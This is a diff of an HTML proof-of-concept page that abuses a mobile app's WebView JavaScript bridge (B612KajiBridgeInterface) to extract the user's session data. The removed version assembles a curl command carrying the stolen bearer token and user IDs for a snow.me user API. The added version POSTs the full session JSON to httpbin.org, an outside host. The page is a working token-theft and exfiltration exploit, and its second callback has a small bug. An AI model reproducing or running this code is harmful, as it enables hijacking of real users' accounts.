@@ -1,62 +1,45 @@
+ <!DOCTYPE html>
+  <html>
+  <head><title>X</title><meta charset="utf-8"></head>
+  <body style="background:#000;color:#0f0;font:12px monospace;padding:10px">
+  <div id="s">Loading...</div>
+  <script>
+  var B = window.B612KajiBridgeInterface;
+  var s = document.getElementById('s');
 
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Token Extractor</title>
-    <meta charset="utf-8">
-    <style>
-        body{font-family:monospace;padding:10px;background:#000;color:#0f0;font-size:10px}
-        pre{white-space:pre-wrap;word-break:break-all}
-        .copy-btn{background:#0f0;color:#000;border:none;padding:5px 10px;margin:5px 0;cursor:pointer}
-    </style>
-</head>
-<body>
-    <h3>Session Token Extractor for curl PoC</h3>
-    <div id="output"></div>
-    <script>
-    var Bridge = window.B612KajiBridgeInterface;
+  if (B) {
+      s.innerHTML = 'Bridge OK<br>';
 
-    function addOutput(text) {
-        document.getElementById('output').innerHTML += text + '<br><br>';
-    }
+      window.c1 = function(d) {
+          var x = typeof d === 'string' ? JSON.parse(d) : d;
+          s.innerHTML += 'Session captured<br>';
 
-    if (typeof B612KajiBridgeInterface !== 'undefined') {
-        Bridge = B612KajiBridgeInterface;
+          var xhr = new XMLHttpRequest();
+          xhr.open('POST', 'https://httpbin.org/post', true);
+          xhr.setRequestHeader('Content-Type', 'application/json');
+          xhr.send(JSON.stringify({session: x}));
 
-        // 전체 세션 데이터 추출
-        window.cb1 = function(data) {
-            var d = typeof data === 'string' ? JSON.parse(data) : data;
-            addOutput('<b>=== FULL SESSION DATA ===</b>');
-            addOutput('<pre>' + JSON.stringify(d, null, 2) + '</pre>');
+          s.innerHTML += '<br><b>userDigit:</b><br>';
+          s.innerHTML += '<textarea style="width:100%;height:60px;font-size:10px">' + (x.userDigit ||
+  'N/A') + '</textarea>';
 
-            // 모든 키 나열
-            addOutput('<b>=== ALL KEYS ===</b>');
-            for (var key in d) {
-                addOutput(key + ': ' + JSON.stringify(d[key]).substring(0, 100));
-            }
+          s.innerHTML += '<br><b>Full Session JSON:</b><br>';
+          s.innerHTML += '<textarea style="width:100%;height:200px;font-size:8px">' + JSON.stringify(x,
+  null, 2) + '</textarea>';
+      };
+      B.getUserSession('c1');
 
-            // curl 명령어 생성
-            var curlCmd = 'curl -X GET "https://user-snow-api.snow.me/v1/user/me"';
-            if (d.userDigit) curlCmd += ' -H "x-user-digit: ' + d.userDigit + '"';
-            if (d.accessToken) curlCmd += ' -H "Authorization: Bearer ' + d.accessToken + '"';
-            if (d.userId) curlCmd += ' -H "x-user-id: ' + d.userId + '"';
+      window.c2 = function(d) {
+          var x = typeof d === 'string' ? JSON.parse(d) : x;
+          s.innerHTML += '<br><b>duid:</b><br>';
+          s.innerHTML += '<textarea style="width:100%;height:30px;font-size:10px">' + (x.duid || 'N/A') +
+  '</textarea>';
+      };
+      B.appInfo('c2');
 
-            addOutput('<b>=== CURL COMMAND ===</b>');
-            addOutput('<pre>' + curlCmd + '</pre>');
-        };
-        Bridge.getUserSession('cb1');
-
-        // 앱 정보도 추출
-        window.cb2 = function(data) {
-            var d = typeof data === 'string' ? JSON.parse(data) : data;
-            addOutput('<b>=== APP INFO ===</b>');
-            addOutput('<pre>' + JSON.stringify(d, null, 2) + '</pre>');
-        };
-        Bridge.appInfo('cb2');
-
-    } else {
-        addOutput('Bridge not found');
-    }
-    </script>
-</body>
-</html>
+  } else {
+      s.innerHTML = 'No Bridge';
+  }
+  </script>
+  </body>
+  </html>
